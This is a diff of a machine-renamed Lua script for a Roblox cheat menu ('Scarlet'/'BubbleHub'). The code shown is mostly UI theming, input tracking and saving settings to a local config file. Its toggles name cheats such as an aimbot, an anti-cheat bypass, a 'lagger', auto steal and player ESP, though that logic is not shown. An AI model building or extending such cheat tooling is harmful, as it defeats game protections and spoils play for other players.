+        return math.clamp(M, d, if Ki < d then d else Ki), math.clamp(t, Xi, if ci < Xi then Xi else ci);
+    end;
+    local function v(M, u, t, G, D, d)
+        local Ki, Ri = Y(u, t, G, D, M.Size.X.Offset, M.Size.Y.Offset, d);
+        M.Position = UDim2.new(u, Ki, G, Ri);
+        return Ki, Ri;
+    end;
+    local function Y()
+        return false;
+    end;
+    local M = setmetatable({}, {__mode = "k"});
+    _G.__BubbleTrackConn (R.InputChanged:Connect(function(u) local t = M[u]; if not t then return; end; if u.UserInputType ~= Enum.UserInputType.Touch and u.UserInputType ~= Enum.UserInputType.MouseMovement then return; end; for G, G in ipairs(t) do if(u.Position - G.tapStart).Magnitude > 12 then G.tapMoved = true; end; end; end));
+    _G.__BubbleTrackConn (R.InputEnded:Connect(function(u) local t = M[u]; if not t then return; end; M[u] = nil; for u, u in ipairs(t) do if not u.tapMoved and true then if not(u.scroll and u.scrollCanvasAtStart and math.abs(u.scroll.CanvasPosition.Y - u.scrollCanvasAtStart) > 5) then u.callback(); end; end; end; end));
+    local function u(t, G)
+        if Y() then
+            return;
+        end;
+        t.InputBegan:Connect(function(t) if t.UserInputType ~= Enum.UserInputType.Touch and t.UserInputType ~= Enum.UserInputType.MouseButton1 then return; end; local D, d = Scroll, M[t]; if not d then d = {}; M[t] = d; end; table.insert(d, {tapStart = t.Position, tapMoved = false, scroll = D, scrollCanvasAtStart = D and D.CanvasPosition.Y or nil, callback = G}); end);
+    end;
+    local M, t, G, D, d = {["245,250,255"] = Color3.fromRGB(9, 24, 52), ["235,245,255"] = Color3.fromRGB(12, 34, 70), ["210,230,250"] = Color3.fromRGB(18, 48, 92), ["190,220,250"] = Color3.fromRGB(28, 78, 132), ["140,190,240"] = Color3.fromRGB(36, 108, 174), ["80,160,255"] = Color3.fromRGB(45, 140, 220), ["50,110,190"] = Color3.fromRGB(148, 220, 255), ["80,130,200"] = Color3.fromRGB(160, 225, 255), ["40,80,150"] = Color3.fromRGB(135, 210, 255), ["30,90,200"] = Color3.fromRGB(115, 200, 255), ["60,120,200"] = Color3.fromRGB(145, 215, 255), ["100,140,200"] = Color3.fromRGB(165, 225, 255)}, {"BackgroundColor3", "BorderColor3"}, {"BackgroundColor3", "TextColor3", "BorderColor3"}, {"TextColor3", "TextStrokeColor3", "TextStrokeTransparency"}, {[Enum.FontWeight.Thin] = Enum.FontWeight.ExtraLight, [Enum.FontWeight.ExtraLight] = Enum.FontWeight.Light, [Enum.FontWeight.Light] = Enum.FontWeight.Regular, [Enum.FontWeight.Regular] = Enum.FontWeight.Medium, [Enum.FontWeight.Medium] = Enum.FontWeight.SemiBold, [Enum.FontWeight.SemiBold] = Enum.FontWeight.Bold, [Enum.FontWeight.Bold] = Enum.FontWeight.ExtraBold};
+    local function Ki(Ri)
+        if not(Ri:IsA("TextLabel") or(Ri:IsA("TextButton")) or(Ri:IsA("TextBox"))) then
+            return;
+        end;
+        if Ri:GetAttribute("BubbleSlightFontWeightApplied") or(Ri:GetAttribute("BubbleSlightFontWeightPending")) then
+            return;
+        end;
+        Ri:SetAttribute("BubbleSlightFontWeightPending", true);
+        task.defer(function() if not Ri.Parent or(Ri:GetAttribute("BubbleSlightFontWeightApplied")) then Ri:SetAttribute("BubbleSlightFontWeightPending", nil); return; end; local Xi = pcall(function() local ci = Ri.FontFace; local ii = d[ci.Weight]; if ii then Ri.FontFace = Font.new(ci.Family, ii, ci.Style); end; end); Ri:SetAttribute("BubbleSlightFontWeightPending", nil); if Xi then Ri:SetAttribute("BubbleSlightFontWeightApplied", true); end; end);
+    end;
+    local d;
+    local Ri = setmetatable({}, {__mode = "k"});
+    local function Xi(ci)
+        local ii = ci;
+        while ii and not ii:IsA("GuiButton") and not ii:GetAttribute("BubbleButtonThemeControl") do
+            ii = ii.Parent;
+        end;
+        if not ii then
+            return;
+        end;
+        ii = ci:IsA("UIStroke") and "Color" or ci:IsA("UIGradient") and "Color" or ci:IsA("GuiObject") and "BackgroundColor3";
+        if not ii then
+            return;
+        end;
+        local Qi = Ri[ci];
+        if not Qi then
+            Qi = {};
+            Ri[ci] = Qi;
+            _G.__BubbleTrackConn (ci:GetPropertyChangedSignal(ii):Connect(function() Xi(ci); end));
+        end;
+        if Qi.busy then
+            return;
+        end;
+        local Ri = ci[ii];
+        if Ri == Qi.applied and Qi.theme == _G.__BubbleGuiTheme then
+            return;
+        end;
+        if Ri ~= Qi.applied then
+            Qi.original = Ri;
+        end;
+        local hi = _G.__BubbleGuiTheme;
+        local function mi(Ai)
+            if hi ~= "GUI 2" and hi ~= "GUI 3" then
+                return Ai;
+            end;
+            local Hi = math.max(Ai.R, Ai.G, Ai.B);
+            return Color3.fromRGB(7, 22, 48):Lerp(Color3.fromRGB(125, 215, 255), Hi);
+        end;
+        local Ai = Qi.original;
+        if ci:IsA("UIGradient") then
+            if hi == "GUI 2" or hi == "GUI 3" then
+                local Hi = {};
+                for Ei, Ei in ipairs(Ai.Keypoints) do
+                    table.insert(Hi, ColorSequenceKeypoint.new(Ei.Time, mi(Ei.Value)));
+                end;
+                Ai = (ColorSequence.new(Hi));
+            end;
+        else
+            Ai = (mi(Ai));
+        end;
+        Qi.applied = Ai;
+        Qi.theme = hi;
+        if Ri ~= Ai then
+            Qi.busy = true;
+            ci[ii] = Ai;
+            Qi.busy = false;
+        end;
+    end;
+    d = function(Ri)
+        if not Ri then
+            return;
+        end;
+        local ci;
+        if Ri:IsA("TextLabel") or(Ri:IsA("TextButton")) or(Ri:IsA("TextBox")) then
+            Ki(Ri);
+            ci = G;
+        else
+            ci = if Ri:IsA("GuiObject") then
+                t
+            else
+                ci;
+            end;
+            if ci then
+                for G, ii in ipairs(ci) do
+                    G = Ri[ii];
+                    local Qi = string.format("%d,%d,%d", math.floor(G.R * 255 + 0.5), math.floor(G.G * 255 + 0.5), math.floor(G.B * 255 + 0.5));
+                    if M[Qi] then
+                        Ri[ii] = M[Qi];
+                    end;
+                end;
+            end;
+            if Ri:IsA("UIStroke") then
+                ci = Ri.Color;
+                local G = string.format("%d,%d,%d", math.floor(ci.R * 255 + 0.5), math.floor(ci.G * 255 + 0.5), math.floor(ci.B * 255 + 0.5));
+                if ci.B > ci.R + 12 and ci.B >= ci.G then
+                    Ri.Color = Color3.fromRGB(0, 0, 0);
+                elseif M[G] then
+                    Ri.Color = M[G];
+                end;
+            end;
+            if not _G.__BubbleModernGuiActive and not Ri:GetAttribute("BubbleDarkPaletteWatched") then
+                Ri:SetAttribute("BubbleDarkPaletteWatched", true);
+                local function M(G)
+                    _G.__BubbleTrackConn (Ri:GetPropertyChangedSignal(G):Connect(function() d(Ri); end));
+                end;
+                if Ri:IsA("UIStroke") then
+                    M("Color");
+                elseif Ri:IsA("GuiObject") then
+                    for G, G in ipairs(t) do
+                        M(G);
+                    end;
+                    if Ri:IsA("TextLabel") or(Ri:IsA("TextButton")) or(Ri:IsA("TextBox")) then
+                        for t, t in ipairs(D) do
+                            M(t);
+                        end;
+                    end;
+                end;
+            end;
+            Xi(Ri);
+        end;
+        _G.__BubbleThemeRoots = {};
+        local M = setmetatable({}, {__mode = "k"});
+        function _G.__BubbleRegisterThemeRoot (t)
+            if not t then
+                return;
+            end;
+            for G, G in ipairs(_G.__BubbleThemeRoots) do
+                if G == t then
+                    return;
+                end;
+            end;
+            table.insert(_G.__BubbleThemeRoots, t);
+            d(t);
+            if M[t] then
+                M[t]();
+            end;
+            M[t] = _G.__BubbleWalkDescendantsBatched (t, d, function() return t.Parent ~= nil; end);
+            _G.__BubbleTrackConn (t.DescendantAdded:Connect(d));
+        end;
+        function _G.__BubbleApplyTheme ()
+            for t, t in ipairs(_G.__BubbleThemeRoots) do
+                if t and t.Parent then
+                    d(t);
+                    if M[t] then
+                        M[t]();
+                    end;
+                    M[t] = _G.__BubbleWalkDescendantsBatched (t, d, function() return t.Parent ~= nil; end);
+                end;
+            end;
+        end;
+        function _G.__BubbleAddUnifiedPanelShade (M, t, G)
+            local D = M and(M:FindFirstChild("UnifiedBackgroundShade"));
+            if D then
+                D:Destroy();
+            end;
+            D = M and(M:FindFirstChild("UnifiedPanelWhiteOutline"));
+            if D then
+                D:Destroy();
+            end;
+            D = M and(M:FindFirstChild("UnifiedPanelWhiteGlow"));
+            if D then
+                D:Destroy();
+            end;
+            D = Instance.new("Frame");
+            D.Name = "UnifiedBackgroundShade";
+            D.Size = UDim2.fromScale(1, 1);
+            D.Position = UDim2.fromScale(0, 0);
+            D.BackgroundColor3 = Color3.fromRGB(0, 0, 0);
+            D.BackgroundTransparency = 0.68;
+            D.BorderSizePixel = 0;
+            D.Active = false;
+            D.ZIndex = G or 1;
+            D.Parent = M;
+            Instance.new("UICorner", D).CornerRadius = UDim.new(0, t or 16);
+            G = Instance.new("UIGradient", D);
+            G.Rotation = 90;
+            G.Transparency = NumberSequence.new({NumberSequenceKeypoint.new(0, 0.28), NumberSequenceKeypoint.new(0.55, 0.42), NumberSequenceKeypoint.new(1, 0.56)});
+            return D;
+        end;
+        local M = {[Enum.UserInputType.Gamepad1] = true, [Enum.UserInputType.Gamepad2] = true, [Enum.UserInputType.Gamepad3] = true, [Enum.UserInputType.Gamepad4] = true, [Enum.UserInputType.Gamepad5] = true, [Enum.UserInputType.Gamepad6] = true, [Enum.UserInputType.Gamepad7] = true, [Enum.UserInputType.Gamepad8] = true};
+        local function t(G)
+            return G and G.KeyCode and G.KeyCode ~= Enum.KeyCode.Unknown and(G.UserInputType == Enum.UserInputType.Keyboard or M[G.UserInputType]);
+        end;
+        local function G(D)
+            return D and D.UserInputType == Enum.UserInputType.Keyboard and D.KeyCode == Enum.KeyCode.RightControl;
+        end;
+        local D, d = {}, {MB3 = "Mouse3"};
+        pcall(function() D[Enum.UserInputType.MouseButton3] = "MB3"; end);
+        local function Ri(Xi)
+            return Xi and D[Xi.UserInputType] ~= nil;
+        end;
+        local function Xi(ci)
+            return D[ci.UserInputType];
+        end;
+        local function D(ci)
+            if not ci then
+                return "-";
+            end;
+            if type(ci) == "string" then
+                return d[ci] or ci;
+            end;
+            return tostring(ci):match("KeyCode%.(.+)") or(tostring(ci));
+        end;
+        b = {["Inf Jump"] = false, ["Anti Bat"] = false, ["TP Down"] = false, ["Auto TP Down"] = false, ["Anti Ragdoll"] = false, ["Ragdoll Counter"] = false, ["Medusa Counter"] = false, Aimbot = false, ["Lagger Aimbot"] = false, Autoplay = false, Drop = false, ["auto steal"] = false, ["ESP Players"] = false, ["Player Tracers"] = false, ["Show Buttons"] = false, ["Lock Buttons"] = false, ["Show FPS"] = false, ["FPS Boost"] = false, ["Anti Lag"] = false, Optimizer = true, Lagger = false, Bypass = false, ["Speed Boost"] = true, ["Toggle UI"] = true, ["Auto Steal Speed"] = false, ["Auto Carry Speed"] = false, ["Carry Speed"] = false, Unwalk = false, ["Harder Hit Anim"] = false, Animaciones = false, ["Custom FOV"] = false, ["Stretchz Res"] = false, ["Sky Changer"] = false, ["Skin Changer"] = false, ["Headless Visual"] = false, ["Korblox Visual"] = false, ["Anti Die"] = false};
+        for ci, ii in pairs(b) do
+            E[ci] = ii;
+        end;
+        local ci, ii;
+        local Qi = 0;
+        local function hi(mi)
+            if not mi or mi == ci then
+                return;
+            end;
+            pcall(writefile, "Scarlet_UI_Config.txt", mi);
+            ci = mi;
+        end;
+        local function mi()
+            local Ai = {};
+            for Hi, Ei in pairs(E) do
+                if not s[Hi] then
+                    table.insert(Ai, "T:" .. Hi .. "=" .. tostring(Ei));
+                end;
+            end;
+            for Hi, Ei in pairs(V) do
+                table.insert(Ai, "S:" .. Hi .. "=" .. tostring(Ei));
+            end;
+            for Hi, Ei in pairs(F) do
+                table.insert(Ai, "B:" .. Hi .. "=" .. tostring(Ei));
+            end;
+            for Hi, Ei in pairs(N) do
+                table.insert(Ai, "V:" .. Hi .. "=" .. tostring(Ei));
+            end;
+            for Hi, Ei in pairs(P) do
+                table.insert(Ai, "A:" .. Hi .. "=" .. tostring(Ei));
+            end;
+            for Hi, Hi in ipairs(I) do
+                table.insert(Ai, "C:" .. Hi.name .. "=" .. Hi.boost .. "," .. Hi.steal);
+            end;
+            if _G.__BubbleHub_Anims then
+                _G.__savedAnimations = _G.__savedAnimations or {};
+                for Hi, Ei in pairs(_G.__BubbleHub_Anims) do
+                    if Ei and tostring(Ei) ~= "" then
+                        _G.__savedAnimations[Hi] = Ei;
+                        table.insert(Ai, "N:" .. Hi .. "=" .. tostring(Ei));
+                    end;
+                end;
+            elseif type(_G.__savedAnimations) == "table" then
+                for Hi, Ei in pairs(_G.__savedAnimations) do
+                    if Ei and tostring(Ei) ~= "" then
+                        table.insert(Ai, "N:" .. Hi .. "=" .. tostring(Ei));
+                    end;
+                end;
+            end;
+            table.insert(Ai, "M:selectedMode=" .. _);
+            table.insert(Ai, "M:optimizerMode=Normal");
+            table.insert(Ai, "M:autoplayMode=" .. (_G.__autoplayMode or "Full"));
+            table.insert(Ai, "M:skyIndex=" .. tostring(_G.__skyGetIndex and(_G.__skyGetIndex ()) or 1));
+            table.insert(Ai, "M:skyMode=" .. tostring(_G.__BubbleSkyChangerMode or "blue"));
+            table.insert(Ai, "M:katanaIndex=" .. tostring(_G.__katanaGetIndex and(_G.__katanaGetIndex ()) or 1));
+            table.insert(Ai, "M:autoStealMode=" .. (k == "v2" and "v2" or "v1"));
+            table.insert(Ai, "M:carrySpeedMode=" .. (n or "v1"));
+            table.insert(Ai, "M:dropMode=" .. (_G.__BubbleDropMode == "Jump Drop" and "Jump Drop" or "Stand Drop"));
+            table.insert(Ai, "M:infJumpMode=" .. (_G.__BubbleInfJumpMode or "hold"));
+            table.insert(Ai, "M:panelVisible=" .. tostring(_G.__BubblePanelVisible ~= false));
+            table.insert(Ai, "M:batVersion=" .. tostring(_G.__batVersion or 1));
+            table.insert(Ai, "M:skinChangerMode=" .. x);
+            table.insert(Ai, "M:buttonsSize=" .. tostring(_G.__BubbleButtonsSize or 1));
+            table.insert(Ai, "M:tpBatV2Distance=" .. tostring(math.clamp(tonumber(_G.__tpBatV2Distance) or 8, 0, 100)));
+            table.insert(Ai, "M:animationPreset=" .. tostring(_G.__BubbleAnimationPreset or "Cartoon"));
+            table.insert(Ai, "M:animacionesOn=" .. tostring(E.Animaciones == true or E["Harder Hit Anim"] == true));
+            table.insert(Ai, "M:batAimbotOn=" .. tostring((_G.ScarletAutoBat and _G.ScarletAutoBat.IsEnabled and _G.ScarletAutoBat.IsEnabled()) or false));
+            table.insert(Ai, "M:guiTheme=" .. tostring(_G.__BubbleGuiTheme or "GUI 1"));
+            table.insert(Ai, "M:themePrimary=" .. (_G.__BubbleThemePrimary or "BLACK"));
+            table.insert(Ai, "M:themeSecondary=" .. (_G.__BubbleThemeSecondary or "BLUE"));
+            table.insert(Ai, "M:autoGrabExpanded=" .. tostring(_G._BubbleHub_UI_AutoGrabExpanded ~= false));
+            for Hi, Ei in pairs(q) do
+                if Ei then
+                    local si = type(Ei) == "string" and Ei or (tostring(Ei):match("KeyCode%.(.+)") or tostring(Ei));
+                    table.insert(Ai, "K:" .. Hi .. "=" .. si);
+                end;
+            end;
+            -- Always save modes / positions OUTSIDE keybind loop (fixes batMode + bg not saving)
+            table.insert(Ai, "M:introMusicIndex=" .. tostring(L));
+            table.insert(Ai, "M:bgIndex=" .. tostring(_G._BubbleHub_UI_BgIndex or 1));
+            table.insert(Ai, "M:batMode=NORMAL");
+            table.insert(Ai, "M:bypassAimbotOn=" .. tostring((_G.ScarletBypassBat and _G.ScarletBypassBat.IsEnabled and _G.ScarletBypassBat.IsEnabled()) or _G.__ScarletBypassBatOn == true or E["Bypass Aimbot"] == true));
+            table.insert(Ai, "M:normalAimbotOn=" .. tostring((_G.ScarletAutoBat and _G.ScarletAutoBat.IsEnabled and _G.ScarletAutoBat.IsEnabled()) or E.Aimbot == true or E["Bat Aimbot"] == true));
+            table.insert(Ai, "M:SpeedHideUI=" .. tostring(q and q.SpeedHideUI));
+            table.insert(Ai, "M:ToggleUIBind=" .. tostring(q and q.ToggleUI));
+            table.insert(Ai, "M:BypassAimbotBind=" .. tostring(q and q.BypassAimbot));
+            table.insert(Ai, "M:swingSound=" .. tostring(_G.__ScarletSwingSound or "Normal"));
+            table.insert(Ai, "M:minecraftBat=" .. tostring(_G.__ScarletMinecraftBat == true));
+            table.insert(Ai, "M:minecraftBatColor=" .. tostring(_G.__ScarletMinecraftBatColor or "Default"));
+            table.insert(Ai, "M:outfitIndex=" .. tostring(_G.__ScarletOutfitIndex or 1));
+            table.insert(Ai, "M:customAnims=" .. tostring(_G.__ScarletCustomAnims == true));
+            table.insert(Ai, "M:speedPanelOpen=" .. tostring(_G.__ScarletSpeedPanelOpen == true));
+            table.insert(Ai, "M:speedPanelCollapsed=" .. tostring(_G.__ScarletSpeedPanelCollapsed == true));
+            table.insert(Ai, "M:speedPanelFamily=" .. tostring(_G.__ScarletSpeedPanelFamily or "normal"));
+            if _G._BubbleHub_UI_MenuPos then
+                local Hi = _G._BubbleHub_UI_MenuPos;
+                if Hi.x and Hi.y then
+                    table.insert(Ai, "P:menuPos=" .. math.floor(Hi.x) .. "," .. math.floor(Hi.y));
+                end;
+            end;
+            if _G.__toggleBtn then
+                table.insert(Ai, "P:toggleBtn=" .. math.floor(_G.__toggleBtn.Position.X.Offset) .. "," .. math.floor(_G.__toggleBtn.Position.Y.Offset));
+            end;
+            for Hi, Ei in pairs(C) do
+                if Ei.x and Ei.y then
+                    table.insert(Ai, "P:mobileBtn_" .. Hi .. "=" .. math.floor(Ei.x) .. "," .. math.floor(Ei.y) .. (if Ei.xs and Ei.ys then ":" .. Ei.xs .. ":" .. Ei.ys else ""));
+                end;
+            end;
+            for Hi, Ei in pairs(r) do
+                if Ei.x and Ei.y then
+                    table.insert(Ai, "P:quickBtn_" .. Hi .. "=" .. math.floor(Ei.x) .. "," .. math.floor(Ei.y));
+                end;
+            end;
+            if _G._BubbleHub_UI_SpeedFramePos then
+                local Hi = _G._BubbleHub_UI_SpeedFramePos;
+                if Hi.x and Hi.y then
+                    table.insert(Ai, "P:speedFrame=" .. math.floor(Hi.x) .. "," .. math.floor(Hi.y));
+                end;
+            end;
+            if _G._BubbleHub_UI_SpeedPanelPos then
+                local Hi = _G._BubbleHub_UI_SpeedPanelPos;
+                if Hi.x and Hi.y then
+                    table.insert(Ai, "P:speedPanel=" .. math.floor(Hi.x) .. "," .. math.floor(Hi.y));
+                end;
+            end;
+            if _G._BubbleHub_EnemyWidget_SaveHook then
+                pcall(_G._BubbleHub_EnemyWidget_SaveHook);
+            end;
+            if _G._BubbleHub_UI_EnemyWidgetPos then
+                local Hi = _G._BubbleHub_UI_EnemyWidgetPos;
+                if Hi.x and Hi.y then
+                    table.insert(Ai, "P:enemyWidget=" .. math.floor(Hi.x) .. "," .. math.floor(Hi.y));
+                end;
+            end;
+            if _G._BubbleHub_UI_AutoGrabBarPos then
+                local Hi = _G._BubbleHub_UI_AutoGrabBarPos;
+                if Hi.x and Hi.y then
+                    table.insert(Ai, "P:autoGrabBar=" .. math.floor(Hi.x) .. "," .. math.floor(Hi.y));
+                end;
+            end;
+            if _G._BubbleHub_UI_AutoGrabBarSize then
+                table.insert(Ai, "P:autoGrabBarSize=" .. tostring(_G._BubbleHub_UI_AutoGrabBarSize));
+            end;
+            if _G._BubbleHub_UI_ModernMiniPos then
+                local Hi = _G._BubbleHub_UI_ModernMiniPos;
+                if Hi.x and Hi.y then
+                    table.insert(Ai, "P:modernMini=" .. math.floor(Hi.x) .. "," .. math.floor(Hi.y));
+                end;
+            end;
+            local Hi = table.concat(Ai, "\10");
+            if Hi == ci or Hi == ii then
+                return;
+            end;
+            ii = Hi;
+            _G._BubbleHub_UI_Data = Hi;
+            Qi += 1;
+            local ci = Qi;
+            -- immediate + debounced write for reliability
+            pcall(function()
+                if type(writefile) == "function" then
+                    writefile("Scarlet_UI_Config.txt", Hi);
+                end;
+            end);
+            task.delay(0.08, function() if ci ~= Qi or ii ~= Hi then return; end; ii = nil; hi(Hi); end);
+        end;
+            _G.__BubbleTrackStopper (function() if ii then hi(ii); ii = nil; end; end);
+            function FeatureToggles.BypassAuto()
+                if _G.BubbleBypass and _G.BubbleBypass.SetBypass and _G.BubbleBypass.IsEnabled then
+                    local ci = _G.BubbleBypass.IsEnabled() == true;
+                    pcall(_G.BubbleBypass.SetBypass, not ci);
+                    pcall(function() if _G.__syncBypassVisual then _G.__syncBypassVisual (); end; end);
+                else
+                    if _G.__openBypassGUI then
+                        _G.__openBypassGUI ();
+                    end;
+                    task.spawn(function() for ci = 1, 20, 1 do task.wait(0.1); if _G.BubbleBypass and _G.BubbleBypass.SetBypass and _G.BubbleBypass.IsEnabled then break; end; end; if _G.BubbleBypass and _G.BubbleBypass.SetBypass and _G.BubbleBypass.IsEnabled then local ci = _G.BubbleBypass.IsEnabled() == true; pcall(_G.BubbleBypass.SetBypass, not ci); end; pcall(function() if _G.__syncBypassVisual then _G.__syncBypassVisual (); end; end); end);
+                end;
+            end;
+            local function ci(ii)
+                local Qi, hi = {"Aimbot", "TP Bat"}, false;
+                for Ai, Hi in ipairs(Qi) do
+                    if Hi ~= ii and Hi ~= "TP Bat" and E[Hi] then
+                        E[Hi] = false;
+                        Ai = e[Hi];
+                        if Ai then
+                            pcall(Ai, false);
+                        end;
+                        if W[Hi] then
+                            pcall(W[Hi], false);
+                        end;
+                        hi = true;
+                    end;
+                end;
+                if hi then
+                    mi();
+                end;
+            end;
+            function _G.__deactivateBatExclusive (ii)
+                local Qi, hi = {"Aimbot", "TP Bat"}, false;
+                for Ai, Hi in ipairs(Qi) do
+                    if Hi ~= ii and Hi ~= "TP Bat" and E[Hi] then
+                        E[Hi] = false;
+                        Ai = e[Hi];
+                        if Ai then
+                            pcall(Ai, false);
+                        end;
+                        if W[Hi] then
+                            pcall(W[Hi], false);
+                        end;
+                        hi = true;
+                    end;
+                end;
+                if hi then
+                    mi();
+                end;
+            end;
+            (function() local ii, Qi = pcall(readfile, "Scarlet_UI_Config.txt"); local hi = if ii and Qi and #Qi > 0 then Qi else if _G._BubbleHub_UI_Data and #_G._BubbleHub_UI_Data > 0 then _G._BubbleHub_UI_Data else nil; if not hi then return; end; for Ai in hi:gmatch("[^\10]+") do local hi, Hi, Ei = Ai:sub(1, 2), Ai:sub(3):match("([^=]+)=(.+)"); if Hi and Ei then Hi, Ei = Hi:match("^%s*(.-)%s*$"), Ei:match("^%s*(.-)%s*$"); if hi == "T:" and E[Hi] ~= nil and not s[Hi] then E[Hi] = Ei == "true"; elseif hi == "S:" then V[Hi] = Ei == "true"; elseif hi == "B:" then F[Hi] = Ei == "true"; elseif hi == "V:" and N[Hi] ~= nil then Qi = tonumber(Ei); if Qi then N[Hi] = Qi; if Hi == "NormalBoost" then z = Qi; end; if Hi == "NormalSteal" then S = Qi; end; if Hi == "LaggerBoost" then g = Qi; end; end; elseif hi == "N:" then _G.__savedAnimations = _G.__savedAnimations or {}; _G.__savedAnimations [Hi] = Ei; elseif hi == "M:" then if Hi == "introMusicIndex" then L = tonumber(Ei) or 2; elseif Hi == "bgIndex" then local bi = tonumber(Ei) or 1; _G._BubbleHub_UI_BgIndex = math.clamp(bi, 1, 4); elseif Hi == "selectedMode" then Ai = Ei == "Off" or Ei == "LaggerNormal" or Ei == "LaggerCarry" or Ei == "Normal" or Ei == "Lagger" or Ei == "Desync"; if Ai then _ = Ei; end; elseif Hi == "autoplayMode" then if Ei == "Full" or Ei == "Semi" then _G.__autoplayMode = Ei; end; elseif Hi == "skyIndex" then _G.__savedSkyIndex = tonumber(Ei); elseif Hi == "skyMode" then if Ei == "day" or Ei == "blue" or Ei == "night" then _G.__BubbleSkyChangerMode = Ei; end; elseif Hi == "katanaIndex" then _G.__savedKatanaIndex = tonumber(Ei); elseif Hi == "autoStealMode" then if Ei == "v3" then Ei = "v1"; end; ii = Ei == "v1" or Ei == "v2"; if ii then k = Ei; end; elseif Hi == "carrySpeedMode" then local s = Ei == "v1" or Ei == "v2"; if s then n = Ei; end; elseif Hi == "optimizerMode" then if Ei == "Normal" or Ei == "Ultra" then _G.__optimizerMode = Ei; end; elseif Hi == "dropMode" then _G.__BubbleDropMode = Ei == "Jump Drop" and "Jump Drop" or "Stand Drop"; elseif Hi == "infJumpMode" then if Ei == "hold" or Ei == "manual" then _G.__BubbleInfJumpMode = Ei; end; elseif Hi == "autoGrabExpanded" then _G._BubbleHub_UI_AutoGrabExpanded = Ei == "true"; elseif Hi == "panelVisible" then _G.__BubblePanelVisible = Ei == "true"; E["Toggle UI"] = _G.__BubblePanelVisible; elseif Hi == "themePrimary" then if Ei == "BLACK" or Ei == "WHITE" then _G.__BubbleThemePrimary = Ei; end; elseif Hi == "themeSecondary" then if Ei == "BLUE" or Ei == "RED" or Ei == "CONTRAST" then _G.__BubbleThemeSecondary = Ei; end; elseif Hi == "buttonsSize" then local s = tonumber(Ei); if s and s == s and math.abs(s) < math.huge then _G.__BubbleButtonsSize = math.clamp(s, 0.5, 2); end; elseif Hi == "skinChangerMode" then x = (Ei == "V2" or Ei == "V3") and Ei or "V1"; elseif Hi == "batVersion" then _G.__batVersion = tonumber(Ei) == 2 and 2 or 1; if _G.__batVersionPill then _G.__batVersionPill.Text = "V" .. tostring(_G.__batVersion or 1); end; elseif Hi == "tpBatV2Distance" then _G.__tpBatV2Distance = math.clamp(tonumber(Ei) or 8, 0, 100); elseif Hi == "animationPreset" then _G.__BubbleAnimationPreset = Ei; elseif Hi == "animacionesOn" then local on = Ei == "true"; E.Animaciones = on; E["Harder Hit Anim"] = on; elseif Hi == "batAimbotOn" then if Ei == "true" then task.defer(function() if _G.ScarletAutoBat and _G.ScarletAutoBat.SetEnabled then pcall(_G.ScarletAutoBat.SetEnabled, true); end; end); end; elseif Hi == "batMode" then local bm = (tostring(Ei):upper() == "BYPASS") and "BYPASS" or "NORMAL"; _G.__ScarletBatMode = bm; elseif Hi == "bypassAimbotOn" then _G.__ScarletBypassBatOn = (Ei == "true"); elseif Hi == "normalAimbotOn" then _G.__ScarletNormalAimbotOn = (Ei == "true"); elseif Hi == "customAnims" then _G.__ScarletCustomAnims = (Ei == "true"); elseif Hi == "outfitIndex" then _G.__ScarletOutfitIndex = tonumber(Ei) or 1; elseif Hi == "minecraftBatColor" then _G.__ScarletMinecraftBatColor = Ei; elseif Hi == "swingSound" then _G.__ScarletSwingSound = (Ei == "Katana") and "Katana" or "Normal"; elseif Hi == "minecraftBat" then _G.__ScarletMinecraftBat = (Ei == "true"); elseif Hi == "introSongIndex" then _G.__ScarletIntroSongIndex = math.clamp(tonumber(Ei) or 1, 1, 15); elseif Hi == "speedPanelOpen" then _G.__ScarletSpeedPanelOpen = Ei == "true"; elseif Hi == "speedPanelCollapsed" then _G.__ScarletSpeedPanelCollapsed = Ei == "true"; elseif Hi == "speedPanelFamily" then if Ei == "normal" or Ei == "lagger" then _G.__ScarletSpeedPanelFamily = Ei; end; elseif Hi == "guiTheme" then _G.__BubbleGuiTheme = "GUI 1"; end; elseif hi == "A:" and P[Hi] ~= nil then local s = tonumber(Ei); if s then P[Hi] = s; end; elseif hi == "C:" then local s, V = Ei:match("([^,]+),([^,]+)"); if s and V then table.insert(I, {name = Hi, boost = tonumber(s) or 59, steal = tonumber(V) or 29}); end; elseif hi == "K:" then if d[Ei] then q[Hi] = Ei; else local s, V = pcall(function() return Enum.KeyCode[Ei]; end); if s then q[Hi] = V; end; end; elseif hi == "P:" then if Hi == "menuPos" then local s, V = Ei:match("(-?%d+),(-?%d+)"); if s and V then _G._BubbleHub_UI_MenuPos = {x = tonumber(s), y = tonumber(V)}; end; elseif Hi == "toggleBtn" then local s, V = Ei:match("(-?%d+),(-?%d+)"); if s and V then _G._BubbleHub_UI_BtnPos = {x = tonumber(s), y = tonumber(V)}; end; elseif Hi == "speedFrame" then local s, V = Ei:match("(-?%d+),(-?%d+)"); if s and V then _G._BubbleHub_UI_SpeedFramePos = {x = tonumber(s), y = tonumber(V)}; end; elseif Hi == "enemyWidget" then local s, V = Ei:match("(-?%d+),(-?%d+)"); if s and V then _G._BubbleHub_UI_EnemyWidgetPos = {x = tonumber(s), y = tonumber(V)}; end; elseif Hi == "autoGrabBar" then local s, V = Ei:match("(-?%d+),(-?%d+)"); if s and V then _G._BubbleHub_UI_AutoGrabBarPos = {x = tonumber(s), y = tonumber(V)}; end; elseif Hi == "autoGrabBarSize" then local s = tonumber(Ei); if s then _G._BubbleHub_UI_AutoGrabBarSize = s; end; elseif Hi == "modernMini" then local s, V = Ei:match("(-?%d+),(-?%d+)"); if s and V then _G._BubbleHub_UI_ModernMiniPos = {x = tonumber(s), y = tonumber(V)}; end; elseif Hi == "speedPanel" then local s, V = Ei:match("(-?%d+),(-?%d+)"); if s and V then _G._BubbleHub_UI_SpeedPanelPos = {x = tonumber(s), y = tonumber(V)}; end; else local s = Hi:match("^quickBtn_(.+)$"); if s then local V, F = Ei:match("^(-?%d+),(-?%d+)"); if V and F then r[s] = {x = tonumber(V), y = tonumber(F)}; end; else local s = Hi:match("^mobileBtn_(.+)$"); if s then local V, F = Ei:match("^(-?%d+),(-?%d+)"); if V and F then _G._BubbleHub_UI_MobileBtnPos = _G._BubbleHub_UI_MobileBtnPos or {}; local L, ii, Qi = {x = tonumber(V), y = tonumber(F)}, Ei:match(":(-?%d+):(-?%d+)$"); if ii and Qi then L.xs = tonumber(ii); L.ys = tonumber(Qi); end; _G._BubbleHub_UI_MobileBtnPos [s] = L; end; end; end; end; end; end; end; end)();
+            E["Speed Boost"] = _ ~= "Off";
+            _G.__BubbleSpeedValues = _G.__BubbleSpeedValues or {};
+            _G.__BubbleSpeedValues.NormalBoost = N.NormalBoost;
